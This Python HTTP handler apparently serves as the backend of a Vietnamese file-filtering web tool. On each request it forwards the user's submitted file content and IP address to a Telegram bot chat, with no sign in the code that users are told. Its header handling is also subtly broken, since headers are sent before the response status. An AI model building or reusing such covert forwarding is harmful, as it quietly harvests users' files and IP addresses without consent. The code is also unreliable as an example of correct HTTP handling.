from http.server import BaseHTTPRequestHandler
import requests
import os
import json
import io

class handler(BaseHTTPRequestHandler):

    def do_POST(self):
        BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
        CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

        if not BOT_TOKEN or not CHAT_ID:
            self.send_response(500)
            self.wfile.write(json.dumps({'error': 'Missing env vars'}).encode('utf-8'))
            return

        try:
            content_len = int(self.headers.get('Content-Length', 0))
            post_body = self.rfile.read(content_len)
            data = json.loads(post_body)
            file_content = data.get('filteredData', 'Không có nội dung')
            ip_address = self.headers.get('X-Forwarded-For', 'Không rõ IP')
            
            message_caption = f"🔔 Có người vừa lọc file!\n\n**IP:** `{ip_address}`\n**File data đính kèm:**"

            file_bio = io.BytesIO(file_content.encode('utf-8'))
            file_bio.name = 'loc_data.txt'
            
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {'document': file_bio}
            payload = { 'chat_id': CHAT_ID, 'caption': message_caption, 'parse_mode': 'Markdown' }
            requests.post(url, data=payload, files=files)

        except Exception as e:
            error_message = f"Lỗi API Notify: {str(e)}"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={'chat_id': CHAT_ID, 'text': error_message})

        self.send_header('Access-Control-Allow-Origin', '*') 
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'ok'}).encode('utf-8'))
        return
        
    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        return
